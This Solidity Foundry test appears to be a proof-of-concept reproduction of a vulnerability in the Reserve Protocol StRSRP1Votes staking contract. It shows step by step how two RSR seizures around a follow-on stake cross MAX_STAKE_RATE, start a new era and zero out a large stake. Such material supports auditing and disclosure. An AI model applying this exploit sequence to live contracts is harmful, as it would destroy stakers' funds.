// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/reserve/target/p1/StRSRVotes.sol";
import "../src/reserve/target/interfaces/IMain.sol";
import "../src/reserve/target/interfaces/IAssetRegistry.sol";
import "../src/reserve/target/interfaces/IBasketHandler.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MockRSR is ERC20 {
    constructor() ERC20("Reserve Rights", "RSR") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockStRSRMain {
    IERC20 internal immutable rsrToken;
    address internal immutable backing;

    constructor(IERC20 rsr_, address backing_) {
        rsrToken = rsr_;
        backing = backing_;
    }

    function rsr() external view returns (IERC20) { return rsrToken; }
    function backingManager() external view returns (IBackingManager) { return IBackingManager(backing); }
    function assetRegistry() external pure returns (IAssetRegistry) { return IAssetRegistry(address(0)); }
    function basketHandler() external pure returns (IBasketHandler) { return IBasketHandler(address(0)); }
    function frozen() external pure returns (bool) { return false; }
    function tradingPausedOrFrozen() external pure returns (bool) { return false; }
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
}

contract PoC_27332 is Test {
    StRSRP1Votes internal stRSR;
    MockRSR internal rsr;
    MockStRSRMain internal main;
    address internal constant STAKER = address(0xA11CE);
    address internal constant BACKING_MANAGER = address(0xBEEF);

    function setUp() public {
        rsr = new MockRSR();
        main = new MockStRSRMain(rsr, BACKING_MANAGER);
        // StRSR is an upgradeable implementation whose constructor locks the
        // implementation initializer. Exercise the production initialization
        // path through an ERC1967 proxy.
        StRSRP1Votes implementation = new StRSRP1Votes();
        bytes memory initData = abi.encodeWithSignature(
            "init(address,string,string,uint48,uint192,uint192)",
            address(main),
            "Staked RSR",
            "stRSR",
            uint48(60),
            uint192(0),
            uint192(0)
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        stRSR = StRSRP1Votes(address(proxy));

        rsr.mint(STAKER, 3 ether);
        vm.startPrank(STAKER);
        rsr.approve(address(stRSR), type(uint256).max);
        stRSR.stake(1 ether);
        vm.stopPrank();
    }

    function test_small_follow_on_seizure_wipes_significant_stake() public {
        uint256 eraBefore = stRSR.currentEra();

        // Leave a very small but nonzero backing balance.  The first seizure
        // raises stakeRate close to the production MAX_STAKE_RATE (1e9).
        uint256 firstSeizure = 1 ether - 1_050_000_000;
        vm.prank(BACKING_MANAGER);
        stRSR.seizeRSR(firstSeizure);

        // Staking more RSR does not lower the rate; it restores a large
        // economic position while the rate remains just below the threshold.
        vm.prank(STAKER);
        stRSR.stake(1 ether);
        // The exchange rate is already close to MAX_STAKE_RATE, so the
        // additional stake mints roughly 9.5e26 stRSR units: a substantial
        // position even though only a small RSR balance remains.
        assertGt(stRSR.totalSupply(), 1e26);

        uint256 secondSeizure = rsr.balanceOf(address(stRSR)) / 10;
        vm.prank(BACKING_MANAGER);
        stRSR.seizeRSR(secondSeizure);

        // The exact vulnerable branch in StRSR.sol crosses MAX_STAKE_RATE and
        // calls beginEra(), zeroing the current era's otherwise large stake.
        assertGt(stRSR.currentEra(), eraBefore);
        assertEq(stRSR.totalSupply(), 0);
        assertEq(stRSR.balanceOf(STAKER), 0);
    }
}
